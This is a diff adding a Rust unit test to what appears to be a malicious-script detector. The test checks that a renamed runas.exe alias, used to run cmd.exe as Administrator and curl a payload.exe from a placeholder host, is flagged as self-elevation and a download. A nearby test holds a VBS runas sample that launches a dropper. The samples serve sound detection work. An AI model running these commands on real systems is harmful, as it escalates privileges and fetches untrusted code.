@@ -1948,6 +1948,45 @@ start payload.chm"#;
     }
 
     #[test]
+    fn copied_runas_alias_replays_quoted_child_command() {
+        let script = br#"copy C:\Windows\System32\runas.exe C:\Users\Public\ra.tmp
+C:\Users\Public\ra.tmp /user:Administrator "cmd.exe /c curl -o out.exe https://copied-runas.example/payload.exe""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\ra.tmp"#
+            )),
+            "copied runas alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("copied-runas.example"))
+            )),
+            "copied runas SelfElevation not detected: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-runas.example/payload.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "copied runas child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn vbs_shell_execute_runas_emits_self_elevation_trait() {
         let script = br#"Set UAC = CreateObject("Shell.Application")
 UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
